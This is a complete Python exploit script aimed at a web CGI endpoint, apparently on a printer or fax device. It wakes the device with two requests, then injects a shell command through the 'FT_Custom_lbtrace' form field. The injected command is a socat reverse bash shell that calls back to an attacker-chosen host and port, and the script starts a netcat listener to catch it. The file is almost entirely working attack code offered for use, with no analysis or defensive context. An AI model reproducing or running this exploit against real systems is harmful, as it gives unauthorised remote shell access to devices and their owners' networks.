#!/usr/bin/python3
import argparse
import os
import requests
import threading
import time
import urllib.parse


def start_listener(lport):
    print(f'[*] Starting listener on 0.0.0.0:{lport}...')
    os.system(f'nc -l {lport}')


def send_payload(url, data):
    time.sleep(2)
    print(f'[*] Sending payload to server...')
    requests.post(url, verify=False, data=data)
    print('[*] Sent payload')

def exploit(target, callback_host, callback_port):
    print(f'[*] Sending wakeup 1...')
    requests.get(f'http://{target}/', verify=False)
    
    print(f'[*] Sending wakeup 2...')
    requests.get(f'http://{target}/', verify=False)

    payload = f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{callback_host}:{callback_port}"
    url = f'http://{target}/cgi-bin/fax_change_faxtrace_settings'
    data = f'FT_Custom_lbtrace=$({payload})'

    t = threading.Thread(target=send_payload, args=(url,data), daemon=True)
    t.start()

    start_listener(callback_port)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-r', '--rhost', help='The IP address of the target', required=True)
    parser.add_argument('-l', '--lhost', help='The IP address of the listening post', required=True)
    parser.add_argument('-p', '--lport', help='The port of the listening post', default=443)
    args = parser.parse_args()

    exploit(args.rhost, args.lhost, args.lport)
